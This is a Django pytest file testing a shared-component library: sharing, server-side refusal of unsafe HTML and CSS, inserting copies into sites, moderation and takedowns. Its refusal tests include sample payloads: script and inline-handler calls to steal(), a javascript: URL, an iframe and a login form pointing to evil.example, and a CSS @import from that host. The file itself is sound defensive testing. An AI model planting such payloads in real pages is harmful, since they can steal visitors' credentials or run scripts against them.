"""Sharing a block with strangers.

The refusal rules are the point of this file. A shared component runs on
somebody else's site in front of their visitors, so "the client already checked"
is not a control — the request is just JSON. Every rule the browser enforces is
enforced again here, and the tests below are written so that removing the server
check turns them red.
"""

import pytest
from django.contrib.auth.models import User
from django.urls import reverse
from rest_framework.test import APIClient

from .models import SharedComponent, Site


@pytest.fixture
def author(db):
    user = User.objects.create_user('author', 'a@example.com', 'pw-12345678')
    # Sharing requires skin in the game: one published site of your own.
    Site.objects.create(owner=user, title='Mine', slug='mine', published=True)
    return user


@pytest.fixture
def taker(db):
    user = User.objects.create_user('taker', 't@example.com', 'pw-12345678')
    Site.objects.create(
        owner=user, title='Theirs', slug='theirs', published=False,
        schema={'theme': {}, 'pages': [{'id': 'page_home', 'name': 'Home', 'components': []}]},
    )
    return user


def client_for(user):
    api = APIClient()
    api.force_authenticate(user=user)
    return api


GOOD = {
    'title': 'Pricing card',
    'description': 'A three-tier pricing card.',
    'html': '<div data-pwb-shared="s1" class="card"><h3>Pro</h3></div>',
    'css': '[data-pwb-shared="s1"].card { padding: 24px; }',
    'natural_width': 320,
    'natural_height': 220,
}


def share(api, **overrides):
    payload = {**GOOD, **overrides}
    return api.post(reverse('share-component'), payload, format='json')


class TestSharing:
    def test_publishes_a_static_block(self, author):
        res = share(client_for(author))
        assert res.status_code == 201
        assert res.data['title'] == 'Pricing card'
        assert res.data['policy'] == 'static'
        assert SharedComponent.objects.count() == 1

    def test_needs_a_published_site_of_your_own(self, db):
        # A throwaway account with nothing to lose is the spam shape.
        nobody = User.objects.create_user('nobody', 'n@example.com', 'pw-12345678')
        res = share(client_for(nobody))
        assert res.status_code == 403
        assert res.data['code'] == 'no_published_site'
        assert SharedComponent.objects.count() == 0

    def test_needs_a_name(self, author):
        assert share(client_for(author), title='   ').status_code == 400

    def test_anonymous_cannot_share(self, db):
        assert APIClient().post(reverse('share-component'), GOOD, format='json').status_code in (401, 403)


class TestRefusals:
    """Each of these is a way to make a shared block do something to the person
    who takes it. The sandbox around the published page stops a script reading
    the host's data; it does nothing about most of what is below."""

    @pytest.mark.parametrize('html,why', [
        ('<div><script>steal()</script></div>', 'script'),
        ('<div><button onclick="steal()">x</button></div>', 'inline handler'),
        ('<div><a href="javascript:steal()">x</a></div>', 'javascript: url'),
        ('<div><iframe src="https://evil.example"></iframe></div>', 'iframe'),
        ('<div><object data="x.swf"></object></div>', 'plugin'),
        ('<div><form action="https://evil.example/login"><input name="p"></form></div>', 'off-site form'),
    ])
    def test_refuses(self, author, html, why):
        res = share(client_for(author), html=html)
        assert res.status_code == 400, why
        assert res.data['code'] == 'component_refused'
        assert res.data['problems'], why
        assert SharedComponent.objects.count() == 0

    def test_allows_a_form_that_stays_on_the_page(self, author):
        res = share(client_for(author), html='<div><form action="#go"><input name="q"></form></div>')
        assert res.status_code == 201

    def test_refuses_css_that_reaches_another_site(self, author):
        # @import both leaks the visitor's IP and lets the look change later.
        res = share(client_for(author), css='@import url("https://evil.example/x.css");')
        assert res.status_code == 400

    def test_refuses_oversized_artefacts(self, author):
        assert share(client_for(author), html='<div>' + ('x' * 70000) + '</div>').status_code == 400

    def test_drops_fields_it_was_not_asked_for(self, author):
        # The allowlist trap this codebase has been bitten by: anything not
        # named in the sanitizer must not reach the model.
        res = share(client_for(author), status='removed', use_count=9999, author_id=1)
        assert res.status_code == 201
        component = SharedComponent.objects.get()
        assert component.status == 'published'
        assert component.use_count == 0


class TestUsing:
    def test_puts_a_copy_into_the_chosen_site(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        site = Site.objects.get(owner=taker)

        res = client_for(taker).post(
            reverse('shared-component-use', args=[component.pk]),
            {'site_id': site.pk, 'page_id': 'page_home'},
            format='json',
        )
        assert res.status_code == 200

        site.refresh_from_db()
        blocks = site.schema['pages'][0]['components']
        assert len(blocks) == 1
        assert blocks[0]['type'] == 'html'
        assert 'Pro' in blocks[0]['props']['code']
        # The styles travel with it, or the block arrives naked.
        assert 'padding: 24px' in blocks[0]['props']['code']

    def test_records_where_it_came_from_so_a_takedown_can_find_it(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        site = Site.objects.get(owner=taker)
        client_for(taker).post(
            reverse('shared-component-use', args=[component.pk]),
            {'site_id': site.pk}, format='json',
        )
        site.refresh_from_db()
        assert site.schema['pages'][0]['components'][0]['props']['_sharedFrom'] == component.pk

    def test_lands_below_what_is_already_there(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        site = Site.objects.get(owner=taker)
        site.schema['pages'][0]['components'] = [{
            'id': 'text_1', 'type': 'text', 'props': {'text': 'hi'}, 'styles': {},
            'layout': {'x': 0, 'y': 100, 'w': 200, 'h': 80},
        }]
        site.save()

        client_for(taker).post(
            reverse('shared-component-use', args=[component.pk]),
            {'site_id': site.pk}, format='json',
        )
        site.refresh_from_db()
        added = site.schema['pages'][0]['components'][-1]
        # Never on top of the design it was added to.
        assert added['layout']['y'] >= 180

    def test_counts_the_use(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        site = Site.objects.get(owner=taker)
        client_for(taker).post(
            reverse('shared-component-use', args=[component.pk]),
            {'site_id': site.pk}, format='json',
        )
        component.refresh_from_db()
        assert component.use_count == 1

    def test_cannot_add_to_somebody_else_s_site(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        victim = Site.objects.get(owner=author)
        res = client_for(taker).post(
            reverse('shared-component-use', args=[component.pk]),
            {'site_id': victim.pk}, format='json',
        )
        assert res.status_code == 404
        victim.refresh_from_db()
        assert victim.schema['pages'][0]['components'] == []

    def test_refuses_on_the_way_in_too(self, author, taker):
        # Published before a rule tightened — being in the library already is
        # not a reason to let it into a site.
        bad = SharedComponent.objects.create(
            author=author, title='Old', html='<div><script>x()</script></div>', css='',
        )
        site = Site.objects.get(owner=taker)
        res = client_for(taker).post(
            reverse('shared-component-use', args=[bad.pk]),
            {'site_id': site.pk}, format='json',
        )
        assert res.status_code == 400
        site.refresh_from_db()
        assert site.schema['pages'][0]['components'] == []

    def test_a_withdrawn_component_cannot_be_used(self, author, taker):
        component = SharedComponent.objects.create(author=author, status='withdrawn', **GOOD)
        site = Site.objects.get(owner=taker)
        res = client_for(taker).post(
            reverse('shared-component-use', args=[component.pk]),
            {'site_id': site.pk}, format='json',
        )
        assert res.status_code == 404


class TestFeed:
    def test_lists_only_published_ones(self, author):
        SharedComponent.objects.create(author=author, title='Shown', html='<div>a</div>')
        SharedComponent.objects.create(author=author, title='Gone', html='<div>b</div>', status='withdrawn')
        SharedComponent.objects.create(author=author, title='Removed', html='<div>c</div>', status='removed')

        res = APIClient().get(reverse('shared-components'))
        assert res.status_code == 200
        assert [row['title'] for row in res.data['results']] == ['Shown']

    def test_searches_and_filters(self, author):
        SharedComponent.objects.create(author=author, title='Pricing table', html='<div>a</div>', category='business')
        SharedComponent.objects.create(author=author, title='Gallery', html='<div>b</div>', category='portfolio')

        assert len(APIClient().get(reverse('shared-components'), {'q': 'pricing'}).data['results']) == 1
        assert len(APIClient().get(reverse('shared-components'), {'category': 'portfolio'}).data['results']) == 1

    def test_a_use_outweighs_a_view_in_the_ranking(self, author):
        used = SharedComponent.objects.create(author=author, title='Used', html='<div>a</div>')
        seen = SharedComponent.objects.create(author=author, title='Seen', html='<div>b</div>')
        SharedComponent.objects.filter(pk=used.pk).update(use_count=1)
        SharedComponent.objects.filter(pk=seen.pk).update(view_count=9)
        for component in SharedComponent.objects.all():
            component.recompute_hot_score(save=True)

        titles = [row['title'] for row in APIClient().get(reverse('shared-components')).data['results']]
        # Putting a block on your own site is the strongest signal it is good.
        assert titles[0] == 'Used'


class TestAuthorControl:
    def test_the_author_can_withdraw_their_own(self, author):
        component = SharedComponent.objects.create(author=author, **GOOD)
        res = client_for(author).post(reverse('shared-component-withdraw', args=[component.pk]))
        assert res.status_code == 200
        component.refresh_from_db()
        assert component.status == 'withdrawn'

    def test_nobody_else_can(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        res = client_for(taker).post(reverse('shared-component-withdraw', args=[component.pk]))
        assert res.status_code == 404
        component.refresh_from_db()
        assert component.status == 'published'

    def test_reporting_is_one_per_person(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        url = reverse('shared-component-report', args=[component.pk])
        first = client_for(taker).post(url, {'reason': 'spam'}, format='json')
        second = client_for(taker).post(url, {'reason': 'spam'}, format='json')
        assert first.data['already'] is False
        assert second.data['already'] is True
        assert component.reports.count() == 1


@pytest.fixture
def moderator(db):
    return User.objects.create_user('mod', 'm@example.com', 'pw-12345678', is_staff=True)


def used_by(taker_user, component):
    """Take the component into the taker's site through the real endpoint, so the
    copy carries whatever marker the takedown will have to find."""
    site = Site.objects.filter(owner=taker_user).first()
    res = client_for(taker_user).post(
        reverse('shared-component-use', args=[component.pk]),
        {'site_id': site.pk}, format='json',
    )
    assert res.status_code == 200
    return site


class TestModerationQueue:
    def test_shows_open_reports_with_the_block_attached(self, author, taker, moderator):
        component = SharedComponent.objects.create(author=author, **GOOD)
        client_for(taker).post(reverse('shared-component-report', args=[component.pk]),
                               {'reason': 'malware', 'detail': 'fake login'}, format='json')

        res = client_for(moderator).get(reverse('admin-component-reports'))

        assert res.status_code == 200
        row = res.data['results'][0]
        assert row['component_title'] == 'Pricing card'
        assert row['reason'] == 'malware'
        assert row['detail'] == 'fake login'
        assert row['reporter_username'] == 'taker'
        # The artefact itself, so the moderator judges the block and not its name.
        assert 'Pro' in row['component_html']
        assert 'padding: 24px' in row['component_css']

    def test_is_admin_only(self, author, taker):
        SharedComponent.objects.create(author=author, **GOOD)
        assert client_for(taker).get(reverse('admin-component-reports')).status_code == 403
        assert APIClient().get(reverse('admin-component-reports')).status_code in (401, 403)

    def test_resolving_takes_it_out_of_the_default_queue(self, author, taker, moderator):
        component = SharedComponent.objects.create(author=author, **GOOD)
        client_for(taker).post(reverse('shared-component-report', args=[component.pk]),
                               {'reason': 'spam'}, format='json')
        report = component.reports.first()

        res = client_for(moderator).post(
            reverse('admin-component-report-resolve', args=[report.pk]),
            {'action': 'dismiss'}, format='json',
        )

        assert res.status_code == 200
        assert res.data['status'] == 'dismissed'
        assert client_for(moderator).get(reverse('admin-component-reports')).data['count'] == 0
        assert client_for(moderator).get(
            reverse('admin-component-reports'), {'status': 'all'}).data['count'] == 1

    def test_a_bad_action_is_refused(self, author, taker, moderator):
        component = SharedComponent.objects.create(author=author, **GOOD)
        client_for(taker).post(reverse('shared-component-report', args=[component.pk]),
                               {'reason': 'spam'}, format='json')
        report = component.reports.first()
        res = client_for(moderator).post(
            reverse('admin-component-report-resolve', args=[report.pk]),
            {'action': 'delete'}, format='json',
        )
        assert res.status_code == 400
        assert res.data['code'] == 'invalid_report_action'


class TestTakedown:
    """Two different things a moderator can mean by taking something down, and
    the difference between them is whose pages get edited."""

    def test_removing_unlists_it_but_leaves_copies_alone(self, author, taker, moderator):
        component = SharedComponent.objects.create(author=author, **GOOD)
        site = used_by(taker, component)

        res = client_for(moderator).post(
            reverse('admin-component-moderate', args=[component.pk]),
            {'action': 'remove'}, format='json',
        )

        assert res.status_code == 200
        component.refresh_from_db()
        assert component.status == 'removed'
        # Gone from the library...
        assert client_for(taker).get(reverse('shared-components')).data['count'] == 0
        assert client_for(taker).post(
            reverse('shared-component-use', args=[component.pk]),
            {'site_id': site.pk}, format='json').status_code == 404
        # ...but still on the page of the person who already took it.
        site.refresh_from_db()
        assert len(site.schema['pages'][0]['components']) == 1

    def test_purging_deletes_the_copies_too(self, author, taker, moderator):
        component = SharedComponent.objects.create(author=author, **GOOD)
        site = used_by(taker, component)

        res = client_for(moderator).post(
            reverse('admin-component-moderate', args=[component.pk]),
            {'action': 'purge'}, format='json',
        )

        assert res.status_code == 200
        assert res.data['sites_touched'] == 1
        assert res.data['copies_removed'] == 1
        site.refresh_from_db()
        assert site.schema['pages'][0]['components'] == []

    def test_a_purge_touches_only_the_copies_of_that_block(self, author, taker, moderator):
        keep = SharedComponent.objects.create(author=author, **{**GOOD, 'title': 'Innocent'})
        drop = SharedComponent.objects.create(author=author, **GOOD)
        site = used_by(taker, keep)
        used_by(taker, drop)

        client_for(moderator).post(reverse('admin-component-moderate', args=[drop.pk]),
                                   {'action': 'purge'}, format='json')

        site.refresh_from_db()
        survivors = site.schema['pages'][0]['components']
        assert [block['props']['_sharedFrom'] for block in survivors] == [keep.pk]

    def test_a_takedown_closes_the_reports_that_asked_for_it(self, author, taker, moderator):
        component = SharedComponent.objects.create(author=author, **GOOD)
        client_for(taker).post(reverse('shared-component-report', args=[component.pk]),
                               {'reason': 'copyright'}, format='json')

        client_for(moderator).post(reverse('admin-component-moderate', args=[component.pk]),
                                   {'action': 'remove'}, format='json')

        assert component.reports.first().status == 'resolved'

    def test_restoring_puts_it_back_in_the_library(self, author, taker, moderator):
        component = SharedComponent.objects.create(author=author, status='removed', **GOOD)

        res = client_for(moderator).post(reverse('admin-component-moderate', args=[component.pk]),
                                         {'action': 'restore'}, format='json')

        assert res.status_code == 200
        component.refresh_from_db()
        assert component.status == 'published'
        assert client_for(taker).get(reverse('shared-components')).data['count'] == 1

    def test_only_an_admin_may_take_anything_down(self, author, taker):
        component = SharedComponent.objects.create(author=author, **GOOD)
        res = client_for(taker).post(reverse('admin-component-moderate', args=[component.pk]),
                                     {'action': 'purge'}, format='json')
        assert res.status_code == 403
        component.refresh_from_db()
        assert component.status == 'published'

    def test_a_bad_moderation_action_is_refused(self, author, moderator):
        component = SharedComponent.objects.create(author=author, **GOOD)
        res = client_for(moderator).post(reverse('admin-component-moderate', args=[component.pk]),
                                         {'action': 'nuke'}, format='json')
        assert res.status_code == 400
        assert res.data['code'] == 'invalid_component_action'
